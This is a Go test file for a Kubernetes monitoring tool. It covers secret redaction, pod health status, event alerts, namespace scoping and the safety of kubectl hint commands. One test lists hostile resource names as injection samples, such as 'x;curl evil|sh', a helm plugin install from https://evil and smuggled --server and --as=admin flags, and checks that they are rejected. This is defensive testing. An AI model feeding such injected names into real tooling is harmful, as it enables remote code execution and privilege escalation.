package monitor

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	"github.com/dlebee/k8s-buddy/internal/alert"
)

func TestRedactSecretDropsValuesKeepsKeys(t *testing.T) {
	s := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{Name: "db", Annotations: map[string]string{
			corev1.LastAppliedConfigAnnotation: `{"data":{"password":"aHVudGVyMg=="}}`,
			"keep":                             "me",
		}},
		Data:       map[string][]byte{"password": []byte("hunter2"), "user": []byte("admin")},
		StringData: map[string]string{"token": "abc"},
	}
	out, _ := redactSecret(s)
	got := out.(*corev1.Secret)
	if len(got.Data) != 2 || got.Data["password"] != nil || got.Data["user"] != nil {
		t.Fatalf("values not redacted: %v", got.Data)
	}
	if got.StringData["token"] != "" {
		t.Fatal("stringData not redacted")
	}
	if _, ok := got.Annotations[corev1.LastAppliedConfigAnnotation]; ok || got.Annotations["keep"] != "me" {
		t.Fatalf("annotations: %v", got.Annotations)
	}
}

func TestPodStatusCompletedJobIsNeutral(t *testing.T) {
	p := &corev1.Pod{Status: corev1.PodStatus{Phase: corev1.PodSucceeded, ContainerStatuses: []corev1.ContainerStatus{{
		State: corev1.ContainerState{Terminated: &corev1.ContainerStateTerminated{Reason: "Completed"}},
	}}}}
	if s, h := podStatus(p); s != "Completed" || h != HealthNeutral {
		t.Fatalf("got %s/%s", s, h)
	}
}

func TestPodStatusCrashLoopIsBad(t *testing.T) {
	p := &corev1.Pod{Status: corev1.PodStatus{Phase: corev1.PodRunning, ContainerStatuses: []corev1.ContainerStatus{{
		State: corev1.ContainerState{Waiting: &corev1.ContainerStateWaiting{Reason: "CrashLoopBackOff"}},
	}}}}
	if s, h := podStatus(p); !strings.Contains(s, "CrashLoop") || h != HealthBad {
		t.Fatalf("got %s/%s", s, h)
	}
}

func TestEventAlerts(t *testing.T) {
	newCluster := func() (*cluster, *alert.Store) {
		st := alert.NewStore()
		return &cluster{name: "c", store: st, startedAt: time.Now()}, st
	}
	ev := func(reason, msg string, count int32, age time.Duration) *corev1.Event {
		return &corev1.Event{
			Reason: reason, Message: msg, Count: count, Type: corev1.EventTypeWarning,
			LastTimestamp:  metav1.NewTime(time.Now().Add(-age)),
			InvolvedObject: corev1.ObjectReference{Kind: "Node", Name: "aks-node-0"},
		}
	}

	c, st := newCluster()
	c.onEvent(ev("VMEventScheduled", "Node condition VMEventScheduled is now: True", 1, 2*time.Hour))
	l := st.List(alert.Query{})
	if len(l) != 1 || l[0].Severity != alert.Notice || l[0].Category != "maintenance" || !strings.HasPrefix(l[0].Title, "Upcoming VM maintenance") {
		t.Fatalf("maintenance event emitted before start should alert: %+v", l)
	}

	c, st = newCluster()
	c.onEvent(ev("Unhealthy", "Readiness probe failed: timeout", 1, 0))
	if n := len(st.List(alert.Query{})); n != 0 {
		t.Fatalf("single probe failure should not alert, got %d", n)
	}
	c.onEvent(ev("Unhealthy", "Readiness probe failed: timeout", 4, 0))
	if l := st.List(alert.Query{}); len(l) != 1 || l[0].Title != "Readiness probe failing · node/aks-node-0" {
		t.Fatalf("repeated probe failures should alert: %+v", l)
	}
}

func TestApplyScopesClustersAndNamespaces(t *testing.T) {
	rows := []Resource{
		{Cluster: "a", Namespace: "web", Name: "p1"},
		{Cluster: "a", Namespace: "db", Name: "p2"},
		{Cluster: "b", Namespace: "web", Name: "p3"},
		{Cluster: "a", Name: "node-1"}, // cluster-scoped rows ignore the namespace filter
	}
	out := newResourceList("pods", nil, true)
	out.apply(rows, ResourceQuery{Namespaces: []string{"web", "kube-system"}})
	var names []string
	for _, r := range out.Items {
		names = append(names, r.Name)
	}
	if strings.Join(names, ",") != "node-1,p1,p3" {
		t.Fatalf("got %v", names)
	}
	if strings.Join(out.Namespaces, ",") != "db,web" {
		t.Fatalf("namespace options should ignore the namespace filter, got %v", out.Namespaces)
	}
	if !inScope(nil, "x") || inScope([]string{"a"}, "b") || !inScope([]string{"a", "b"}, "b") {
		t.Fatal("inScope")
	}
}

func TestGenericPathCannotReachCoreSecrets(t *testing.T) {
	for _, k := range []string{"cr:/secrets", "cr:/configmaps", "cr:/pods"} {
		if _, ok := genericFor(k); ok {
			t.Errorf("%s must not resolve through the generic path", k)
		}
	}
	if _, ok := genericFor("cr:cert-manager.io/certificates"); !ok {
		t.Error("custom resources must still resolve")
	}
	obj := map[string]any{
		"kind":       "Secret",
		"data":       map[string]any{"password": "aHVudGVyMg=="},
		"stringData": map[string]any{"token": "abc"},
		"metadata": map[string]any{"name": "s", "managedFields": []any{1}, "annotations": map[string]any{
			"kubectl.kubernetes.io/last-applied-configuration": `{"stringData":{"token":"abc"}}`, "keep": "me"}},
	}
	redactObject(obj)
	b, _ := json.Marshal(obj)
	for _, leak := range []string{"aHVudGVyMg", "abc", "last-applied", "managedFields"} {
		if strings.Contains(string(b), leak) {
			t.Errorf("redacted object still contains %q: %s", leak, b)
		}
	}
	if !strings.Contains(string(b), `"password":"\u003chidden by k8s-buddy\u003e"`) || !strings.Contains(string(b), `"keep":"me"`) {
		t.Errorf("keys and other annotations should survive: %s", b)
	}
}

func TestEventHintRejectsInjectedNames(t *testing.T) {
	bad := []corev1.ObjectReference{
		{Kind: "Pod", Namespace: "ns", Name: "x --server=https://evil --insecure-skip-tls-verify"},
		{Kind: "Pod", Namespace: "ns", Name: "x;curl evil|sh"},
		{Kind: "Pod", Namespace: "ns", Name: "x\nhelm plugin install https://evil"},
		{Kind: "Pod --as=admin", Namespace: "ns", Name: "x"},
		{Kind: "Pod", Namespace: "-n=kube-system", Name: "x"},
	}
	for _, o := range bad {
		if h := eventHint("c", o, strings.ToLower(o.Kind)+"/"+o.Name); h != "" {
			t.Errorf("%+v produced hint %q", o, h)
		}
	}
	good := corev1.ObjectReference{Kind: "Pod", Namespace: "ns", Name: "web-0.x"}
	if h := eventHint("c", good, "pod/web-0.x"); h != "kubectl --context c -n ns describe pod/web-0.x" {
		t.Errorf("good name: %q", h)
	}
}
